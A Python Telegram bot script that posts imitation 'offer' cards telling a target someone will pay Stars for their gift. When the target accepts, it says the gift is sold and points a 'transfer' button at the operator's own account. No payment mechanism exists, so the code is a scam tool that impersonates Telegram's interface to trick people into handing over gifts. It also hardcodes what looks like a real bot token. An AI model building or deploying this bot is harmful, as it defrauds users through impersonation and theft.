# language: Python, file: bot.py, target: Python 3.10+
import telebot
from telebot import types
import time
from urllib.parse import unquote, urlparse
from datetime import datetime, timedelta
from flask import Flask
import threading
import os

# --- НАСТРОЙКИ ---
BOT_TOKEN = "8997370724:AAE2xIrI1Sde0AQLkcANXXUJJYHvZalF648"
ADMIN_ID = 6484025560
MY_USERNAME = "@Gangster1246"

STAR = '<tg-emoji emoji-id="5875465628285931233">⭐</tg-emoji>'
GIFT_EMOJI = '<tg-emoji emoji-id="5875465628285931233">🎁</tg-emoji>'
CLOCK_EMOJI = '<tg-emoji emoji-id="5875465628285931233">⏱</tg-emoji>'

bot = telebot.TeleBot(BOT_TOKEN)

# --- ВЕБ-СЕРВЕР ДЛЯ RENDER (чтобы не засыпал) ---
app = Flask(__name__)

@app.route('/')
def health_check():
    return "Bot is alive", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
def parse_gift_name(url: str) -> str:
    path = urlparse(url).path.strip("/")
    if path:
        return unquote(path.split("/")[-1]).replace("+", " ")
    return "Подарок"

def build_offer_text(gift_name, price, gift_url, expires_at, target_user):
    remaining = expires_at - datetime.now()
    total_sec = max(0, int(remaining.total_seconds()))
    hours = total_sec // 3600
    minutes = (total_sec % 3600) // 60

    # Ссылка, которая будет кликабельной внутри текста
    clickable_link = f'<a href="{gift_url}">{gift_name}</a>'

    # Текст ровно как на твоем скриншоте
    return (
        f"{GIFT_EMOJI} Пользователь предлагает Вам\n"
        f"<b>{price}</b> {STAR} за подарок {clickable_link}.\n\n"
        f"{CLOCK_EMOJI} Предложение действует ещё <b>{hours} ч. {minutes} мин.</b>"
    )

def offer_keyboard():
    kb = types.InlineKeyboardMarkup()
    kb.row(
        types.InlineKeyboardButton("✅ Принять", callback_data="accept_offer"),
        types.InlineKeyboardButton("❌ Отклонить", callback_data="decline_offer")
    )
    return kb

# --- ОБРАБОТЧИКИ КОМАНД ---
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id, 
        "Бот запущен.\n\n"
        "Используй команду:\n"
        "`/offer <ссылка> <цена> <@юзер>`", 
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['offer'])
def cmd_offer(message):
    # Доступ только для тебя
    if message.from_user.id != ADMIN_ID:
        return

    parts = message.text.split()
    if len(parts) < 4:
        bot.reply_to(message, "❌ Формат: /offer ссылка цена @юзер")
        return

    gift_link = parts[1]
    try:
        price = int(parts[2])
    except ValueError:
        bot.reply_to(message, "❌ Цена должна быть числом")
        return
    target = parts[3]

    gift_name = parse_gift_name(gift_link)
    expires_at = datetime.now() + timedelta(hours=6)
    
    offer_text = build_offer_text(gift_name, price, gift_link, expires_at, target)
    kb = offer_keyboard()

    # Отправляем сообщение с карточкой (disable_web_page_preview=False)
    bot.send_message(
        chat_id=message.chat.id,
        text=offer_text,
        parse_mode="HTML",
        reply_markup=kb,
        disable_web_page_preview=False
    )
    
    # Удаляем саму команду /offer из чата, чтобы было красиво
    try:
        bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
    except:
        pass

@bot.callback_query_handler(func=lambda call: call.data in ["accept_offer", "decline_offer"])
def on_callback(call):
    if call.data == "accept_offer":
        bot.answer_callback_query(call.id, "Оффер принят")
        
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("Передать", url=f"https://t.me/{MY_USERNAME.replace('@', '')}"))

        # Текст после принятия (как на 2-м скриншоте)
        success_text = (
            f"{GIFT_EMOJI} <b>Подарок успешно продан!</b>\n\n"
            f"• Передайте подарок покупателю для зачисления Stars."
        )

        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=success_text,
                parse_mode="HTML",
                reply_markup=kb,
                disable_web_page_preview=False
            )
        except Exception as e:
            print(f"Ошибка при изменении текста: {e}")

    else:
        bot.answer_callback_query(call.id, "Оффер отклонён")
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="❌ Вы отклонили предложение.",
                reply_markup=None
            )
        except Exception:
            pass

# --- ЗАПУСК ---
if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    print("Бот и веб-сервер запущены!")
    bot.infinity_polling(timeout=40, long_polling_timeout=30)
